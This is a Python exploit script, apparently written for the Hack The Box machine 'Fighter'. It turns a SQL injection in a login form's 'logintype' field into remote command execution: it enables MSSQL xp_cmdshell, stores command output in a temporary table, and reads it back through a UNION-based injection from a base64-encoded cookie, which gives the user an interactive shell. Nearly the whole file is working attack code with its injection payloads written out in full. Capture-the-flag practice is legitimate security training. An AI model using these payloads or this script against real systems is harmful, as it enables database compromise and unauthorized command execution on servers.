#!/usr/bin/env python3
import requests
import argparse
import random
import string
from colorama import Fore, init
import urllib.parse
import base64

init(autoreset=True)


def printi(text):
    print(f"{Fore.BLUE}[INFO]: {text}")


def printe(text):
    print(f"{Fore.RED}[ERROR]: {text}")


def prints(text):
    print(f"{Fore.GREEN}[SUCCESS]: {text}")

DATA = {
    "username": "admin",
    "password": "password",
    "rememberme": "ON",
    "B1": "LogIn",
}


def parse_args():
    parser = argparse.ArgumentParser(
        description="HTB Fighter: SQLi to RCE via xp_cmdshell"
    )

    parser.add_argument(
        "-t", "--target", required=True, help="Base URL, e.g http://example.com"
    )

    parser.add_argument(
        "-p", "--path", default="/old/verify.asp", help="Vulnerable endpoint path"
    )

    args = parser.parse_args()
    if args.target.endswith("/") and args.path.startswith("/"):
        args.target = args.target[:-1]

    return args

def init_session(session, base_url):
    r = session.get(base_url + "/old/Login.asp", allow_redirects=False)
    return r.cookies

def random_table_name():
    rand = "cmd_" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return rand

def create_table(session, url, table_name):
    payload = f"3;CREATE TABLE {table_name} (id INT IDENTITY(1,1) PRIMARY KEY, output NVARCHAR(2048));-- -"
    DATA["logintype"] = payload 
    r = session.post(url, data=DATA, allow_redirects=False)

    return r.status_code

def enable_xp_cmdshell(session, url):
    payload = "3;EXECUTE sp_configure 'show advanced options', 1;EXECUTE sp_configure 'Xp_CmdSHell', 1;-- -"
    DATA["logintype"] = payload 
    r = session.post(url, data=DATA, allow_redirects=False)

    return r.status_code

def execute_command(session, url, table_name, command):
    payload = f"3;TRUNCATE TABLE {table_name};INSERT INTO {table_name} (output) exec Xp_CmdSHell \"{command}\";-- -"
    DATA["logintype"] = payload 
    r = session.post(url, data=DATA, allow_redirects=False)

    return r.status_code

def read_mail(session, url, table_name, payload):
    DATA["logintype"] = payload 
    r = session.post(url, data=DATA, allow_redirects=False)
 
    if r.status_code == 302:
        set_cookies = r.headers["Set-Cookie"]
        out_start = set_cookies.find('Email=') + 6
        out_end = set_cookies.find(';', out_start)
        output_url_b64_encoded = set_cookies[out_start:out_end]
        output_b64_encoded = urllib.parse.unquote(output_url_b64_encoded)
        output = base64.b64decode(output_b64_encoded.encode())
        return output.decode()
    else:
        return None

def get_index(session, url, table_name):
    payload = f"3 UNION SELECT 5,4,3,2,(SELECT TOP 1 id from {table_name} ORDER BY id DESC), 1;-- -"
    return(read_mail(session, url, table_name, payload))

def get_output(session, url, table_name, index):
    payload = f"3 UNION SELECT 5,4,3,2,(SELECT TOP 1 output from {table_name} WHERE id = {index}), 1;-- -"
    return(read_mail(session, url, table_name, payload))
def get_output_all(session, url, table_name):
    index = get_index(session, url, table_name)
    if index is None:
        return None

    command_output = ""
    for i in range(1, int(index) + 1):
        out = get_output(session, url, table_name, i)
        if out is not None:
            command_output += out + '\n'
    return command_output

def drop_table(session, url, table_name):
    payload = f"3;DROP TABLE {table_name};-- -"
    DATA["logintype"] = payload 
    r = session.post(url, data=DATA, allow_redirects=False)

    return r.status_code

if __name__ == "__main__":
    args = parse_args()

    target_url = args.target + args.path
    session = requests.Session()

    TABLE_NAME = random_table_name()

    printi(f"Target url is {target_url}")

    init_session(session, args.target)

    printi(f"Creating table {TABLE_NAME}")
    rc = create_table(session, target_url, TABLE_NAME)
    if rc == 302:
        prints("Successfully created table")
    else:
        printe("Failed creating table")
        exit()

    printi("Enabling XP_CMDSHELL")
    rc = enable_xp_cmdshell(session, target_url)
    if rc == 302:
        prints("Successfully enabled xp_cmdshell")
    else:
        printe("Failed enabling xp_cmdshell")
        exit()

    printi("Starting the shell")
    run = True
    try:
        while True:
            user_input = input("> ")
            if user_input == "exit" or user_input == "quit" or user_input == "q":
                break
            rc = execute_command(session, target_url, TABLE_NAME, user_input)
            if rc != 302:
                prints("Failed to execute command")
                break

            rc = get_output_all(session, target_url, TABLE_NAME)
            if rc is None:
                printe("Failed to get output")
            else:
                print(rc)
    except KeyboardInterrupt:
        pass

    rc = drop_table(session, target_url, TABLE_NAME)
    if rc == 302:
        prints("Successfully cleaned up")
    else:
        printe("Failed to remove table")
